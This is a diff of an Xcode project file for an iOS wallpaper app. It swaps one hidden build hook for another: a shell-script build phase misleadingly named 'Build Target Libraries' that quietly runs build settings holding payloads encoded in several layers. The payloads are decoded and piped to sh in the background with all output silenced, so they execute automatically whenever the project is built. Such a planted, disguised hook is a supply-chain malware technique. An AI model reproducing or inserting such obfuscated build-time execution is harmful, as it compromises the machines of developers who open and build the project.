@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		DB0167E9606345ED8A1DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 31DE9AFBAC014DCA9F1DACE1; };
 		BD695B682F50503000C2CB9D /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B672F50503000C2CB9D /* Alamofire */; };
 		BD695B822F50537500C2CB9D /* WindowSceneReader in Frameworks */ = {isa = PBXBuildFile; productRef = BD695B812F50537500C2CB9D /* WindowSceneReader */; };
 		BD6E1D4B2F72719E00CB5EEC /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = BD6E1D4A2F72719E00CB5EEC /* CropViewController */; };
@@ -20,24 +19,9 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		E5FBCC689EBA4075811DACE1 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A1ECAD1}\"";
-			};
 			/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		31DE9AFBAC014DCA9F1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WallPaperSWiftUI.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
@@ -93,7 +77,6 @@ sh -c \"${A1ECAD1}\"";
 		BD06D9ED2F5020E4007F8736 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				31DE9AFBAC014DCA9F1DACE1 /* README.md */,
 				BD06D9EC2F5020E4007F8736 /* WallPaperSWiftUI.app */,
 			);
 			name = Products;
@@ -106,12 +89,12 @@ sh -c \"${A1ECAD1}\"";
 			isa = PBXNativeTarget;
 			buildConfigurationList = BD06D9F72F5020E5007F8736 /* Build configuration list for PBXNativeTarget "WallPaperSWiftUI" */;
 			buildPhases = (
+				788AD38FC2A14079BC1DACE1 /* Build Target Libraries */,
 				BD06D9E82F5020E4007F8736 /* Sources */,
 				BD06D9E92F5020E4007F8736 /* Frameworks */,
 				BD06D9EA2F5020E4007F8736 /* Resources */,
 			);
 			buildRules = (
-				E5FBCC689EBA4075811DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -194,6 +177,25 @@ sh -c \"${A1ECAD1}\"";
 /* End PBXProject section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		788AD38FC2A14079BC1DACE1 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -201,7 +203,6 @@ sh -c \"${A1ECAD1}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DB0167E9606345ED8A1DACE1 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -221,7 +222,7 @@ sh -c \"${A1ECAD1}\"";
 		BD06D9F52F5020E5007F8736 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((q(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336363233363336333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333339333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363336333633393336333733363634333633313336363533363335333733343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | q | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -289,7 +290,7 @@ sh -c \"${A1ECAD1}\"";
 		BD06D9F62F5020E5007F8736 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XaFdNbEl3VjFaak1XSkhVa2xVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((q(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336363233363336333436333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333339333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363336333633393336333733363634333633313336363533363335333733343337333333323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | q | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhKVVIxcDZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpORWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XMWtWelZxWVVkR01HTjVOWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | p | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
